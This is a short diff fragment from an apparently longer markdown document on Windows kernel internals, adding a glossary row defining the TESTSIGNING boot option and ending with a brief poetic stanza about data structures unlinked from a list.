+| **TESTSIGNING** | Boot option that allows unsigned kernel drivers to load; required for development/testing; visible as a desktop watermark |
 
 ---
 
@@ -1007,4 +1355,3 @@ in a forensic scenario. Know your trace before you leave it.
 
 — data structures SEVERED from the list, still breathing,
 the census taker counts what the architecture chooses to show
-
